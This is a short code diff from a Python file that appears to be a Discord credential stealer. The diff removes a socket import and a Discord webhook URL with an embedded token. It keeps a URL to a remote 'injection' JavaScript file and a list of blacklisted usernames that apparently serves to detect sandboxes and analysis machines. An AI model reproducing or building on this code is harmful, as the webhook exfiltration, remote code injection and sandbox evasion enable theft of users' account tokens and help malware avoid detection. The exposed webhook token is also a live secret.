@@ -17,9 +17,6 @@ import subprocess
 import sys
 import shutil
 import uuid
-import socket
-
-wh00k = "https://discord.com/api/webhooks/1176110835421163631/M12BF6Gmst3UGCO5EFMuufk8WaFZV2SJ4rAiYn7_NyZIVs_96GSDNzFkeqYqOcKeCZUq"
 inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
 
 blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
